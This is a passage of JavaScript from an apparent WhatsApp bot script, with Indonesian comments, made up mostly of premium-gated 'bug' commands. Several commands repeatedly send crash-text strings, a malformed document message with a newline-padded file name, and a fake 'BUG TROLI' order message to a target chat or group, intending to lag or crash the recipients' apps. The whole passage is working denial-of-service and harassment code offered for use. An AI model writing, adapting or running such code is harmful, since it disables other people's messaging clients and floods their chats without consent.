hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(Pe, {text: tizi}, {quoted:kalgans})
await sleep(2000)
}
reply(`Sukses mengirim Bug Ke ${Pe} Tolong Jeda 3 Menit Yah`)
break
//=================================================//
case 'troligc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281xxx`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": `${global.ownernumber}@s.whatsapp.net`,
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
hinata.relayMessage(bnnd, order.message, { messageId: order.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
 case 'unlitet' :  {
 let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: `${botname}`}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlidelay' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: virtex7}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlilag' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: cttl}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlibom' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: weg}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlicuy' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
hinata.sendMessage(from, {text: tizi}, {quoted:kalgans})
await sleep(2000)
}
break
//=================================================//
case 'unlidocu': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}

}), { userJid: from, quoted:kalgans})
hinata.relayMessage(from, document.message, { messageId: document.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'unlitroli': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `© ${botname}`,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": virgam,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " BUG TROLI ", // 
"sellerJid": `${global.ownernumber}@s.whatsapp.net`,
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : kalgans})
hinata.relayMessage(from, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
//=================================================//
case 'unlivirtext' :  {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
